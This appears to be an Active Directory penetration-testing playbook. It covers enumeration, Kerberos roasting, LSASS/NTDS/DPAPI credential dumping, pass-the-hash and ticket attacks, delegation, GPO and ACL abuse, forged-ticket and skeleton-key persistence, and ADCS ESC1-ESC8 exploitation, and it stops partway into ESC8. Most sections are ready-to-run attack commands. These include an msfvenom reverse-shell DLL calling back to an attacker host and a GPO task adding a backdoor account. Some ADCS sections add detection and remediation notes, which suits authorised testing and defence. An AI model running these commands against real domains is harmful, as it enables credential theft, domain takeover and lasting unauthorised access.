
## Attack Surface Mapping

### 1. Enumeration Phase

**Objective:** Map the AD attack surface and identify potential entry points

**Sub-Phases:**

#### 1.1 Classic Enumeration
- Users, groups, computers enumeration
- Shares discovery
- Service Principal Names (SPNs)
- GPOs and organizational units

**Tools:**
- **BloodHound/SharpHound** - Attack path analysis and graphing
- **Seatbelt** - Host enumeration and security posture assessment
- **PowerView** - PowerShell-based AD reconnaissance
- **ADRecon** - Comprehensive AD auditing
- **ldapsearch** - LDAP directory queries

**Commands:**
```powershell
# BloodHound CE data collection
./SharpHound.exe -c All --zipfilename corp_audit

# Seatbelt - Comprehensive security checks
Seatbelt.exe -group=all -outputfile=seatbelt_audit.txt

# Seatbelt - Specific checks
Seatbelt.exe DotNet,PowerShell,TokenPrivileges

# PowerView enumeration
Get-DomainUser | Select samaccountname,description
Get-DomainComputer | Select dnshostname,operatingsystem
Get-DomainGPO | Select displayname
```

#### 1.2 LDAP Enumeration
- Anonymous LDAP binds
- Guest account access
- LDAP signing validation

**Commands:**
```bash
# Anonymous LDAP bind check
ldapsearch -x -H ldap://<dc_ip> -b "DC=domain,DC=local"

# Enumerate users via LDAP
python ldapdomaindump.py -u 'domain\user' -p 'password' <dc_ip>
```

#### 1.3 SMB Share Enumeration
- Accessible shares
- World-writable shares
- Sensitive file discovery

**Tools:**
- smbclient
- CrackMapExec
- smbmap

#### 1.4 DNS Enumeration
- DNS zone transfers
- DNS records for key systems
- Wildcard DNS records

**Commands:**
```bash
# DNS zone transfer
dig axfr @<dns_server> domain.local
```

#### 1.5 ADCS Enumeration
- Certificate Authorities
- Certificate templates
- Enrollment rights
- Template vulnerabilities (ESC1-ESC15)

**Tools:**
- **Certify** - ADCS enumeration and exploitation (.NET)
- **Certipy** - Python-based ADCS abuse toolkit
- **PSPKIAudit** - PowerShell ADCS security auditing

**Commands:**
```bash
# Certify - Find vulnerable templates (Windows)
Certify.exe find /vulnerable

# Certify - Find templates with client authentication
Certify.exe find /clientauth

# Certipy - Comprehensive ADCS enumeration (Linux)
certipy find -u <user>@<domain> -p <password> -vulnerable -dc-ip <dc_ip>

# PSPKIAudit - Defensive audit (PowerShell)
Import-Module PSPKIAudit
Invoke-PKIAudit
Get-AuditCertificateTemplate | ?{$_.HasAuthenticationEku}
```

---

## 2. Initial Access & Credential Harvesting

### 2.1 ASREP Roasting

**Description:** Extract password hashes from accounts with "Do not require Kerberos preauthentication" enabled

**Tools:**
- **Rubeus** - .NET Kerberos abuse toolkit for Windows environments
- **GetNPUsers** - Impacket tool for AS-REP roasting from Linux

**Commands:**
```bash
# Rubeus - ASREP roasting (Windows)
Rubeus.exe asreproast /format:hashcat /outfile:asrep_hashes.txt

# Rubeus - Target specific user
Rubeus.exe asreproast /user:<username> /format:hashcat

# Impacket GetNPUsers (Linux)
python GetNPUsers.py <domain>/ -usersfile users.txt -format hashcat -outputfile asrep_hashes.txt

# With valid credentials
python GetNPUsers.py <domain>/<user>:<password> -request -format hashcat -outputfile asrep_hashes.txt
```

**Crack**:
```bash
hashcat -m 18200 asrep_hashes.txt wordlist.txt
```

---

### 2.2 Kerberoasting

**Description:** Request service tickets for SPNs and crack offline to obtain service account passwords

**Tools:**
- **Rubeus** - .NET Kerberos toolkit for service ticket requests
- **GetUserSPNs** - Impacket tool for Kerberoasting from Linux

**Commands:**
```bash
# Rubeus - Kerberoasting (Windows)
Rubeus.exe kerberoast /outfile:hashes.txt

# Rubeus - Kerberoast specific SPN
Rubeus.exe kerberoast /spn:MSSQLSvc/<server> /outfile:mssql_hashes.txt

# Rubeus - Target specific user
Rubeus.exe kerberoast /user:svcaccount /outfile:svc_hash.txt

# Impacket GetUserSPNs (Linux)
python GetUserSPNs.py <domain>/<user>:<password> -request -outputfile kerberoast_hashes.txt

# Request only hashcat format
python GetUserSPNs.py <domain>/<user>:<password> -request -format hashcat -outputfile kerberoast_hashes.txt
```

**Crack:**
```bash
hashcat -m 13100 kerberoast_hashes.txt wordlist.txt
```

---

### 2.3 Blind Kerberoasting

**Description:** Kerberoast without valid credentials (user enumeration + ASREP roasting combined)

**Technique:** Enumerate users, identify AS-REP roastable accounts, then Kerberoast discovered service accounts

---

### 2.4 Password Spraying

**Description:** Attempt common passwords against all user accounts (low and slow to avoid lockouts)

**Tools:** CrackMapExec, Kerbrute

**Commands:**
```bash
# Kerbrute password spray
kerbrute passwordspray -d <domain> users.txt 'Company123!'

# CrackMapExec
crackmapexec smb <dc_ip> -u users.txt -p 'Winter2024!' --continue-on-success
```

---

### 2.5 Credential Dumping

#### LSASS Dumping
**Tools:**
- **SafetyKatz** - Mimikatz fork with in-memory PE loading (evasive)
- **Mimikatz** - Classic Windows credential dumper
- **pypykatz** - Pure Python LSASS memory parser
- **procdump** - Microsoft Sysinternals process dumping utility

**Commands:**
```powershell
# SafetyKatz - Memory-only execution
SafetyKatz.exe "sekurlsa::logonpasswords" "exit"

# Mimikatz - Classic approach
mimikatz "privilege::debug" "sekurlsa::logonpasswords" "exit"

# Procdump + pypykatz (evasive)
procdump -ma lsass.exe lsass.dmp
pypykatz lsa minidump lsass.dmp

# Task Manager method (manual)
# 1. Open Task Manager → Details → lsass.exe
# 2. Right-click → Create dump file
# 3. Transfer dump to Linux
pypykatz lsa minidump lsass.DMP
```

#### NTDS.dit Dumping
**Tools:** secretsdump (Impacket), Mimikatz

**Commands:**
```bash
# DCSync attack
python secretsdump.py <domain>/<user>:<password>@<dc_ip> -just-dc-ntlm

# VSS Shadow Copy method
python secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL
```

#### DPAPI Extraction
**Description:** Decrypt DPAPI-protected credentials (Chrome passwords, Wi-Fi passwords, RDP credentials)

**Tools:**
- **SharpDPAPI** - C# implementation for extracting DPAPI secrets locally and remotely
- **mimikatz** - DPAPI masterkey extraction from LSASS memory
- **DonPAPI** - Python tool for remote DPAPI secret dumping over SMB

**Commands:**
```powershell
# SharpDPAPI - Triage all DPAPI secrets (Windows)
SharpDPAPI.exe triage

# SharpDPAPI - Specific credential extraction
SharpDPAPI.exe masterkeys
SharpDPAPI.exe credentials
SharpDPAPI.exe vaults
SharpDPAPI.exe rdg      # RDCMan.settings
SharpDPAPI.exe keepass  # KeePass databases
SharpDPAPI.exe chrome   # Chrome passwords

# SharpDPAPI - Use domain backup key (requires DA)
SharpDPAPI.exe triage /pvk:domain_backup_key.pvk

# Mimikatz - Extract masterkeys from LSASS
mimikatz "privilege::debug" "sekurlsa::dpapi" "exit"

# DonPAPI - Remote DPAPI extraction (Linux)
python DonPAPI.py <domain>/<user>:<password>@<target_ip>
```

---

## 3. Lateral Movement

### 3.1 Pass-the-Hash (PtH)

**Description:** Use NTLM hash to authenticate without knowing plaintext password

**Tools:** Impacket (psexec, wmiexec, smbexec), CrackMapExec

**Commands:**
```bash
# Impacket psexec
python psexec.py -hashes :< NT_hash> <domain>/<user>@<target_ip>

# CrackMapExec
crackmapexec smb <target_ip> -u <user> -H <nt_hash> -x "whoami"
```

---

### 3.2 Pass-the-Ticket (PtT)

**Description:** Use stolen Kerberos tickets for authentication

**Tools:**
- **Rubeus** - Monitor, harvest, and inject Kerberos tickets
- **Koh** - Token vault for capturing and reusing authentication tokens
- **Mimikatz** - Export and import Kerberos tickets

**Commands:**
```powershell
# Rubeus - Monitor for new TGTs
Rubeus.exe monitor /interval:5 /nowrap

# Rubeus - Harvest all tickets from current session
Rubeus.exe triage

# Rubeus - Dump specific ticket
Rubeus.exe dump /luid:<luid> /nowrap

# Rubeus - Pass-the-ticket
Rubeus.exe ptt /ticket:<base64_ticket>

# Koh - Capture token credentials
Koh.exe capture
Koh.exe list
Koh.exe impersonate <token_id>

# Mimikatz - Export tickets
mimikatz "sekurlsa::tickets /export" "exit"

# Mimikatz - Import ticket
mimikatz "kerberos::ptt <ticket_file>" "exit"
```

---

### 3.3 Overpass-the-Hash

**Description:** Use NTLM hash to request Kerberos TGT

**Tools:**
- **Rubeus** - Request TGT using NTLM hash or AES key
- **Mimikatz** - Classic overpass-the-hash with new process creation

**Commands:**
```powershell
# Rubeus - Request TGT with NTLM hash
Rubeus.exe asktgt /user:<user> /rc4:<nt_hash> /ptt

# Rubeus - Request TGT with AES256 key (better OPSEC)
Rubeus.exe asktgt /user:<user> /aes256:<aes256_key> /ptt /opsec

# Rubeus - Request TGT for specific domain
Rubeus.exe asktgt /user:<user> /rc4:<nt_hash> /domain:<domain> /dc:<dc_fqdn> /ptt

# Mimikatz - Overpass-the-hash
mimikatz "sekurlsa::pth /user:<user> /domain:<domain> /ntlm:<nt_hash> /run:powershell.exe"
```

---

### 3.4 RDP/WinRM Access

**Tools:** xfreerdp, evil-winrm

**Commands:**
```bash
# RDP with hash
xfreerdp /u:<user> /pth:<nt_hash> /v:<target_ip>

# WinRM with password
evil-winrm -i <target_ip> -u <user> -p <password>

# WinRM with hash
evil-winrm -i <target_ip> -u <user> -H <nt_hash>
```

---

## 4. Privilege Escalation

**Host-Based Escalation:**

Before attempting AD-level privilege escalation, enumerate local privilege escalation vectors:

**SharpUp** - C# port of PowerUp for identifying Windows privilege escalation opportunities

```powershell
# Full audit of privilege escalation vectors
SharpUp.exe audit

# Common findings:
# - Unquoted service paths with spaces
# - Modifiable service binaries or configs
# - AlwaysInstallElevated registry keys
# - Token impersonation opportunities
# - Weak scheduled task permissions
# - DLL hijacking opportunities
```

### 4.1 Unconstrained Delegation

**Description:** Computers with unconstrained delegation can impersonate any user who authenticates to them

**Tools:**
- **Rubeus** - Monitor for and extract TGTs from unconstrained delegation hosts
- **PowerView** - Enumerate computers with unconstrained delegation
- **BloodHound** - Graph-based attack path visualization

**Discovery:**
```powershell
# PowerView
Get-DomainComputer -Unconstrained

# BloodHound Cypher
MATCH (c:Computer {unconstraineddelegation:true}) RETURN c

# Rubeus - Enumerate unconstrained delegation
Rubeus.exe asktgt /user:<compromised_user> /rc4:<hash> /nowrap
```

**Exploitation:**
```powershell
# Rubeus - Monitor for incoming TGTs
Rubeus.exe monitor /interval:5 /nowrap /targetuser:<high_value_target>

# Rubeus - Monitor all TGTs
Rubeus.exe monitor /interval:5 /nowrap

# Coerce authentication (printerbug, petitpotam)
python printerbug.py <attacker_unconstrained_host> <dc_hostname>

# Rubeus - Triage all cached tickets
Rubeus.exe triage

# Rubeus - Extract specific TGT
Rubeus.exe dump /luid:<luid> /service:krbtgt /nowrap

# Rubeus - Pass-the-ticket
Rubeus.exe ptt /ticket:<base64_ticket>
```

---

### 4.2 Constrained Delegation

**Description:** Service accounts with constrained delegation can impersonate users to specific SPNs

**Discovery:**
```powershell
# PowerView
Get-DomainUser -TrustedToAuth
Get-DomainComputer -TrustedToAuth

# BloodHound Cypher
MATCH (u:User {hasspn:true})-[:AllowedToDelegate]->(c:Computer) RETURN u,c
```

**Exploitation:**
```bash
# Request TGT
python getTGT.py -dc-ip <dc_ip> <domain>/<user>:<password>

# Request TGS with S4U2Self and S4U2Proxy
python getST.py -spn <target_spn> -impersonate <admin_user> -dc-ip <dc_ip> <domain>/<delegated_user>

# Use ticket
export KRB5CCNAME=<admin_user>.ccache
python psexec.py -k -no-pass <domain>/<admin_user>@<target>
```

---

### 4.3 Resource-Based Constrained Delegation (RBCD)

**Description:** Abuse msDS-AllowedToActOnBehalfOfOtherIdentity attribute to configure delegation

**Prerequisites:** WriteProperty rights on target computer object + ability to add computer accounts

**Exploitation:**
```bash
# Add computer account
python addcomputer.py -computer-name 'EVILCOMP$' -computer-pass 'EvilPass123' -dc-ip <dc_ip> <domain>/<user>:<password>

# Configure RBCD on target
python rbcd.py -delegate-from 'EVILCOMP$' -delegate-to '<target_computer>$' -dc-ip <dc_ip> -action 'write' <domain>/<user>:<password>

# Impersonate administrator
python getST.py -spn 'cifs/<target_computer>' -impersonate Administrator -dc-ip <dc_ip> <domain>/EVILCOMP$:EvilPass123

# Use ticket
export KRB5CCNAME=Administrator.ccache
python psexec.py -k -no-pass <target_computer>
```

---

### 4.4 GPO Abuse

**Description:** Modify GPOs to achieve code execution or privilege escalation

**Tools:**
- **SharpGPOAbuse** - Abuse GPO permissions to add local admins, scheduled tasks, or modify user rights
- **PowerView** - Enumerate GPOs and identify modification permissions

**Discovery:**
```powershell
# PowerView - Find GPOs you can modify
Get-DomainGPO | Get-DomainObjectAcl -ResolveGUIDs | Where-Object {$_.ActiveDirectoryRights -match "WriteProperty|WriteDacl|WriteOwner"}

# Find computers affected by modifiable GPO
Get-DomainOU -GPLink "<GPO_GUID>" | Get-DomainComputer
```

**Exploitation:**
```powershell
# SharpGPOAbuse - Add local admin
SharpGPOAbuse.exe --AddLocalAdmin --UserAccount <user> --GPOName "<GPO_Name>"

# SharpGPOAbuse - Add immediate scheduled task
SharpGPOAbuse.exe --AddComputerTask --TaskName "EvilTask" --Author "NT AUTHORITY\SYSTEM" --Command "cmd.exe" --Arguments "/c net user backdoor Passw0rd! /add" --GPOName "<GPO_Name>"

# SharpGPOAbuse - Add user rights assignment
SharpGPOAbuse.exe --AddUserRights --UserRights "SeDebugPrivilege" --UserAccount <user> --GPOName "<GPO_Name>"

# Force GPO update (on target)
gpupdate /force
```

---

### 4.5 DNSAdmins Abuse

**Description:** Members of DNSAdmins group can execute arbitrary DLLs as SYSTEM on Domain Controllers

**Exploitation:**
```powershell
# Create malicious DLL (msfvenom)
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker_ip> LPORT=4444 -f dll > evil.dll

# Load DLL via dnscmd
dnscmd <dc_hostname> /config /serverlevelplugindll \\<attacker_ip>\share\evil.dll

# Restart DNS service
sc \\<dc_hostname> stop dns
sc \\<dc_hostname> start dns
```

---

### 4.6 ACL Abuse

**Description:** Abuse ACL permissions to escalate privileges

**Common Abuse Primitives:**
- GenericAll → Full control (reset password, add to group, modify attributes)
- GenericWrite → Write properties (scriptPath, msDS-AllowedToActOnBehalfOfOtherIdentity)
- WriteOwner → Change object owner
- WriteDACL → Modify ACL to grant yourself permissions
- AllExtendedRights → ForceChangePassword, DCSync rights

**Discovery:**
```powershell
# Find interesting ACLs (BloodHound)
MATCH p=shortestPath((u:User)-[r:MemberOf|AllExtendedRights|GenericAll|GenericWrite|WriteDacl|WriteOwner*1..]->(g:Group {name:"DOMAIN ADMINS@<DOMAIN>"})) RETURN p
```

**Exploitation Examples:**
```powershell
# Force password reset (ForceChangePassword right)
$cred = Get-Credential
Set-DomainUserPassword -Identity <target_user> -AccountPassword $cred.Password

# Add to group (GenericAll/GenericWrite on group)
Add-DomainGroupMember -Identity 'Domain Admins' -Members '<your_user>'

# Grant DCSync rights (WriteDACL on domain object)
Add-DomainObjectAcl -TargetIdentity "DC=domain,DC=local" -PrincipalIdentity <your_user> -Rights DCSync
```

---

## 5. Domain Persistence

### 5.1 Golden Ticket

**Description:** Forge TGT using krbtgt hash to impersonate any user

**Prerequisites:** krbtgt NT hash or AES256 key (from DCSync)

**Creation:**
```bash
# Impacket ticketer
python ticketer.py -aesKey <krbtgt_aes256> -domain-sid <domain_sid> -domain <domain> Administrator

# Mimikatz
mimikatz "kerberos::golden /user:Administrator /domain:<domain> /sid:<domain_sid> /aes256:<krbtgt_aes256> /ptt"
```

**Usage:**
```bash
export KRB5CCNAME=Administrator.ccache
python psexec.py -k -no-pass <domain>/Administrator@<dc_hostname>
```

---

### 5.2 Silver Ticket

**Description:** Forge TGS for specific service using machine/service account hash

**Prerequisites:** Service account NT hash or AES256 key

**Creation:**
```bash
# Impacket ticketer
python ticketer.py -nthash <machine_nt_hash> -domain-sid <domain_sid> -domain <domain> -spn cifs/<target_server> Administrator

# Mimikatz
mimikatz "kerberos::golden /sid:<domain_sid> /domain:<domain> /target:<target_server> /service:cifs /aes256:<computer_aes256_key> /user:Administrator /ptt"
```

---

### 5.3 Diamond Ticket

**Description:** Modified TGT attack that bypasses some Golden Ticket detections by requesting a real TGT and modifying it

**Tools:** Rubeus, ticketer.py

**Creation:**
```bash
python ticketer.py -request -domain <domain> -user <user> -password <password> -nthash <krbtgt_hash> -domain-sid <domain_sid> -user-id <user_rid> -groups '512,513,518,519,520' Administrator
```

---

### 5.4 Sapphire Ticket

**Description:** Similar to Diamond Ticket but uses S4U2self to request TGS

**Creation:**
```bash
python ticketer.py -request -impersonate Administrator -domain <domain> -user <user> -password <password> -nthash <krbtgt_hash> -domain-sid <domain_sid> 'ignored'
```

---

### 5.5 Skeleton Key

**Description:** Inject backdoor password into LSASS on DC (allows any user to authenticate with master password)

**Installation:**
```powershell
mimikatz "privilege::debug" "misc::skeleton" "exit"
# Master password: mimikatz
```

**Usage:**
```bash
# Any user can authenticate with password "mimikatz"
psexec.py <domain>/<any_user>:mimikatz@<target>
```

---

### 5.6 Custom SSP (Security Support Provider)

**Description:** Install malicious SSP to log cleartext passwords

**Installation:**
```powershell
mimikatz "privilege::debug" "misc::memssp" "exit"
# Passwords logged to: C:\Windows\System32\kiwissp.log
```

---

### 5.7 DSRM (Directory Service Restore Mode) Backdoor

**Description:** Enable DSRM account for network logon to DC

**Configuration:**
```powershell
New-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\" -Name "DsrmAdminLogonBehavior" -Value 2 -PropertyType DWORD
```

**Usage:** Authenticate with DSRM account (local Administrator on DC)

---

### 5.8 DC Shadow

**Description:** Register rogue Domain Controller to replicate changes

**Tools:** Mimikatz

**Execution:**
```powershell
mimikatz "lsadump::dcshadow /object:<target_user> /attribute:primaryGroupID /value:512" "exit"
```

---

### 5.9 ACL Manipulation

**Description:** Modify ACLs to grant backdoor permissions (e.g., DCSync rights)

**Commands:**
```powershell
# Grant DCSync to backdoor user
Add-DomainObjectAcl -TargetIdentity "DC=domain,DC=local" -PrincipalIdentity BackdoorUser -Rights DCSync
```

---

### 5.10 Golden Certificate (ADCS Persistence)

**Description:** Forge arbitrary certificates using compromised CA private key

**Research:** SpecterOps "Certified Pre-Owned" - ForgeCert tool for golden certificate attacks

**Prerequisites:**
- Compromised Enterprise CA server
- CA certificate and private key extracted
- Machine DPAPI access (keys protected by machine DPAPI)

**Impact:**
- Forge certificates for any user with arbitrary validity periods
- Certificates remain valid even after:
  - Password changes
  - Account lockouts
  - krbtgt password rotation
  - User account deletion (if cert generated before deletion)
- Long-term persistence (5-10 year validity typical)
- Bypasses revocation checks (forged certs appear cryptographically valid)

**Why More Powerful Than Golden Ticket:**
- Golden Ticket: Depends on krbtgt hash (must be rotated twice to revoke)
- Golden Certificate: Requires CA certificate revocation (rare, highly disruptive)
- Certificate authentication less monitored than Kerberos anomalies

**Tools:**
- **Certipy** - Python-based CA backup and certificate forging
- **ForgeCert** - SpecterOps tool for certificate forgery (.NET)
- **SharpDPAPI** - Extract CA certificate via DPAPI

**Exploitation:**
```bash
# Step 1: Compromise CA server and extract CA certificate + private key

# Method 1: Certipy - Backup CA certificate (requires DA or CA admin)
certipy ca -backup -ca '<ca_name>' -username <user>@<domain> -hashes :<nt_hash>

# Method 2: Manual extraction via DPAPI (on CA server)
# CA private key location: C:\ProgramData\Microsoft\Crypto\Keys\
# Protected by machine DPAPI - requires SYSTEM access

# SharpDPAPI - Extract CA certificate using machine masterkey
SharpDPAPI.exe certificates /machine

# Step 2: Forge certificate for any user
certipy forge -ca-pfx <ca_cert_and_key.pfx> -upn Administrator@<domain> -subject 'CN=Administrator,CN=Users,DC=CORP,DC=LOCAL'

# Step 3: Request TGT with forged certificate
certipy auth -pfx administrator_forged.pfx -dc-ip <dc_ip>

# Step 4: Use credentials
python psexec.py <domain>/Administrator@<dc_ip> -hashes :<nt_hash>

# Alternative: ForgeCert (Windows)
ForgeCert.exe --CaCertPath <ca_cert.pfx> --CaCertPassword <password> --Subject "CN=User" --SubjectAltName "Administrator@<domain>" --NewCertPath admin_forged.pfx --NewCertPassword NewPassword123
```

**Detection:**
- Monitor CA server access (Event ID 4876: Certificate Services backup started)
- Audit CA certificate private key access
- Certificate authentication anomalies (Event ID 4768 with certificate-based pre-auth)
- Certificates issued with unusual validity periods or subject names

**Remediation:**
- Treat CA servers as Tier 0 assets (equal to Domain Controllers)
- Implement CA key archival and HSM storage
- Regular CA certificate rotation (complex, requires re-issuing all certificates)
- Enhanced CA auditing and monitoring
- Network segmentation for CA infrastructure
- Upon compromise: Revoke compromised CA certificate, deploy new CA

---

## 6. Trust Exploitation

### 6.1 External Trust (One-Way)

**Description:** DomainA → DomainB (A trusts B, B can access A)

**Enumeration:**
```powershell
Get-DomainTrust
Get-DomainForeignGroupMember
```

**Exploitation Vectors:**
- Password reuse
- Credential theft
- Lateral movement with compromised credentials
- ADCS abuse across trusts

---

### 6.2 Bi-Directional Trust

**Description:** DomainA ↔ DomainB (mutual trust)

**Additional Vectors:**
- Unconstrained delegation across trusts
- SID History injection

---

### 6.3 Trust Ticket (SID History Injection)

**Description:** Forge inter-realm TGT with extra-SID to escalate across forest

**Prerequisites:** Trust key hash (from DCSync on trust account)

**Creation:**
```bash
# Dump trust key
python secretsdump.py -just-dc-user '<target_domain>$' <source_domain>/<user>:<password>@<dc_ip>

# Forge trust ticket with extra-SID
python ticketer.py -nthash <trust_hash> -domain-sid <source_sid> -domain <source_domain> -extra-sid <target_domain_sid>-<high_privilege_group_rid> -spn krbtgt/<source_domain> fakeuser

# Or use Golden Ticket with extra-SID
python ticketer.py -nthash <krbtgt_hash> -domain-sid <source_sid> -domain <source_domain> -extra-sid <target_domain_sid>-519 Administrator
```

---

### 6.4 MSSQL Linked Servers

**Description:** MSSQL trusted links can be abused to escalate across domains

**Enumeration:**
```sql
-- List linked servers
EXEC sp_linkedservers

-- Crawl links
EXEC sp_linkedservers_crawl
```

**Exploitation:**
```bash
# Connect to MSSQL
python mssqlclient.py -windows-auth <domain>/<user>:<password>@<sql_server>

# Execute on linked server
SQL> SELECT * FROM OPENQUERY("<linked_server>", 'SELECT SYSTEM_USER')
SQL> EXEC('xp_cmdshell ''whoami''') AT "<linked_server>"
```

**Tools:** PowerUpSQL

```powershell
Get-SQLServerLinkCrawl -username <user> -password <pass> -Verbose -Instance <sql_instance>
```

---

### 6.5 Foreign Group Membership

**Description:** Users/groups from one domain with membership in another

**BloodHound Queries:**
```cypher
// Groups with foreign domain members
MATCH p=(n:Group {domain:"<DOMAIN.FQDN>"})-[:MemberOf]->(m:Group) WHERE m.domain<>n.domain RETURN p

// Users with foreign domain group membership
MATCH p=(n:User {domain:"<DOMAIN.FQDN>"})-[:MemberOf]->(m:Group) WHERE m.domain<>n.domain RETURN p
```

---

## 7. ADCS (Active Directory Certificate Services) Exploitation

**Research Foundation:** SpecterOps "Certified Pre-Owned" (2021) - Comprehensive ADCS attack research

**Key Concepts:**
- ADCS enables PKI-based authentication via certificates
- Certificates can be abused for privilege escalation and persistence
- 8 primary escalation vectors (ESC1-ESC8) with additional variants (ESC9-ESC15)
- Certificate validity often outlasts password changes (5+ years default)

**Attack Primitives:**
- Certificate-based authentication bypasses password requirements
- PKINIT protocol enables Kerberos TGT requests using certificates
- Compromised CA certificates enable long-term persistence (forge any certificate)
- S4U2Self abuse with machine certificates allows impersonation

**Detection Evasion:**
- Certificate authentication doesn't trigger typical password-based alerts
- Forged certificates are cryptographically valid and bypass revocation checks
- Golden Certificate attacks persist beyond krbtgt password rotation

---

### 7.1 ESC1 - Misconfigured Certificate Templates

**Vulnerability:** Template allows arbitrary SAN (Subject Alternative Name) specification

**Dangerous Conditions:**
- CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT enabled
- Low-privilege enrollment rights (Domain Users, Authenticated Users)
- Manager approval not required
- No authorized signatures required
- Template defines authentication EKU (Client Authentication, PKINIT, Smart Card Logon, Any Purpose)

**Impact:** Request certificate as any user (including Domain Admins)

**Tools:**
- **Certify** - Enumerate and exploit vulnerable templates from Windows
- **Certipy** - Python-based ADCS toolkit for Linux

**Exploitation:**
```bash
# Certify - Enumerate ESC1 vulnerable templates
Certify.exe find /vulnerable

# Certify - Request certificate as Administrator
Certify.exe request /ca:<ca_name> /template:<template_name> /altname:Administrator

# Certipy - Enumerate and exploit (Linux)
certipy find -u <user>@<domain> -p <password> -vulnerable -dc-ip <dc_ip>

# Certipy - Request certificate with SAN
certipy req -u <user>@<domain> -p <password> -ca '<ca_name>' -template '<template_name>' -upn Administrator@<domain>

# Certipy - Authenticate with certificate (retrieves NT hash and TGT)
certipy auth -pfx administrator.pfx -dc-ip <dc_ip>

# Use retrieved credentials
python psexec.py <domain>/Administrator@<dc_ip> -hashes :<nt_hash>
```

**Remediation:**
- Disable CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT on templates
- Require manager approval for sensitive templates
- Remove low-privilege enrollment rights
- Enable authorized signature requirements

---

### 7.2 ESC2 - Any Purpose or No EKU

**Vulnerability:** Template defines "Any Purpose" EKU (2.5.29.37.0) or no EKU at all

**Dangerous Conditions:**
- Template has no EKU or defines Any Purpose
- Low-privilege enrollment rights
- Manager approval not required

**Impact:** Certificate can be used for any purpose including client authentication

**Why Dangerous:**
- "Any Purpose" EKU = wildcard for all certificate uses
- Subordinate CA certificates have no EKU (can create new certificates with arbitrary EKUs)
- Bypasses EKU restrictions on domain authentication

**Exploitation:**
```bash
# Certify - Find ESC2 vulnerable templates
Certify.exe find /vulnerable

# Request certificate with Any Purpose EKU
Certify.exe request /ca:<ca_name> /template:<template_name>

# Use certificate for authentication
Rubeus.exe asktgt /user:<user> /certificate:<cert.pfx> /password:<pfx_password> /ptt
```

**Remediation:**
- Define specific EKUs for all templates (never use Any Purpose)
- Remove Subordinate CA templates unless absolutely required
- Restrict enrollment rights to specific security groups

---

### 7.3 ESC3 - Enrollment Agent Templates

**Vulnerability:** Template allows Certificate Request Agent EKU (1.3.6.1.4.1.311.20.2.1)

**Dangerous Conditions:**
- Template defines Certificate Request Agent EKU
- Low-privilege enrollment rights
- No enrollment agent restrictions configured on CA
- Targets exist: templates allowing agent-based enrollment

**Impact:** Request certificates on behalf of any user (two-step attack)

**Attack Flow:**
1. Enroll for enrollment agent certificate
2. Use agent certificate to request certificates on behalf of other users
3. Common targets: Version 1 templates (User, Machine) that don't require signatures

**Exploitation:**
```bash
# Step 1: Certify - Request enrollment agent certificate
Certify.exe request /ca:<ca_name> /template:<agent_template>

# Step 2: Certify - Request certificate on behalf of Administrator
Certify.exe request /ca:<ca_name> /template:User /onbehalfof:DOMAIN\Administrator /enrollcert:<agent_cert.pfx> /enrollcertpw:<password>

# Certipy - Two-step approach (Linux)
# Step 1: Get enrollment agent cert
certipy req -u <user>@<domain> -p <password> -ca '<ca_name>' -template '<agent_template>'

# Step 2: Request on-behalf-of
certipy req -u <user>@<domain> -p <password> -ca '<ca_name>' -template 'User' -on-behalf-of 'DOMAIN\Administrator' -pfx <agent_cert>.pfx

# Authenticate with resulting certificate
certipy auth -pfx administrator.pfx -dc-ip <dc_ip>
```

**Remediation:**
- Disable enrollment agent templates unless required for smart card enrollment
- Configure enrollment agent restrictions (limit which accounts agents can act on behalf of)
- Require manager approval for enrollment agent templates
- Disable Version 1 templates (upgrade to Version 2+ with enhanced security)

---

### 7.4 ESC4 - Vulnerable Certificate Template ACL

**Vulnerability:** User has WriteProperty/WriteOwner/WriteDacl on template

**Exploitation:**
```bash
# Modify template to add ESC1 vulnerability
certipy template -u <user>@<domain> -p <password> -template '<template_name>' -save-old

# Exploit modified template
certipy req -u <user>@<domain> -p <password> -ca '<ca_name>' -template '<template_name>' -upn Administrator@<domain>

# Restore template
certipy template -u <user>@<domain> -p <password> -template '<template_name>' -configuration '<template_name>.json'
```

---

### 7.5 ESC6 - EDITF_ATTRIBUTESUBJECTALTNAME2

**Vulnerability:** CA has EDITF_ATTRIBUTESUBJECTALTNAME2 flag set (allows SAN on any template)

**Exploitation:**
```bash
# Request any certificate with SAN
certipy req -u <user>@<domain> -p <password> -ca '<ca_name>' -template 'User' -upn Administrator@<domain>
```

---

### 7.6 ESC7 - Vulnerable CA Access Control

**Vulnerability:** User has ManageCA or ManageCertificates rights on Certificate Authority

**Dangerous Permissions:**
- **ManageCA** - Full CA configuration control, can enable ESC6, modify settings
- **ManageCertificates** - Approve pending certificate requests, bypass manager approval

**Impact:**
- ManageCA → Enable EDITF_ATTRIBUTESUBJECTALTNAME2 flag (triggers ESC6)
- ManageCertificates → Approve own pending requests, bypass approval requirements

**Attack Flow (ManageCA):**
1. Enable ESC6 flag on CA
2. Request certificate with arbitrary SAN using any template
3. Authenticate as privileged user

**Attack Flow (ManageCertificates):**
1. Request certificate that requires manager approval
2. Approve own request using ManageCertificates permission
3. Use issued certificate for authentication

**Exploitation:**
```bash
# Certify - Check CA permissions
Certify.exe find

# Certify - Enable EDITF_ATTRIBUTESUBJECTALTNAME2 (ManageCA required)
# Note: Must be done via certutil on CA server
certutil -config "<ca_server>\<ca_name>" -setreg policy\EditFlags +EDITF_ATTRIBUTESUBJECTALTNAME2

# Certipy - Enable vulnerable template (ManageCA)
certipy ca -u <user>@<domain> -p <password> -ca '<ca_name>' -enable-template '<vulnerable_template>'

# Certipy - Issue failed/pending certificate (ManageCertificates)
certipy ca -u <user>@<domain> -p <password> -ca '<ca_name>' -issue-request <request_id>

# Retrieve issued certificate
certipy req -u <user>@<domain> -p <password> -ca '<ca_name>' -retrieve <request_id>
```

**Remediation:**
- Audit CA ACLs - Remove unnecessary ManageCA/ManageCertificates permissions
- Restrict CA permissions to designated PKI administrators only
- Enable CA auditing (Event ID 4882, 4883, 4884, 4885, 4886, 4887)
- Monitor for EDITF_ATTRIBUTESUBJECTALTNAME2 flag changes

---

### 7.7 ESC8 - NTLM Relay to AD CS HTTP Endpoints

**Vulnerability:** Certificate Authority web enrollment services accept NTLM authentication

**Vulnerable Endpoints:**
- **Certificate Authority Web Enrollment** - http://<ca_server>/certsrv/
- **Certificate Enrollment Web Service (CES)** - WebServices endpoint
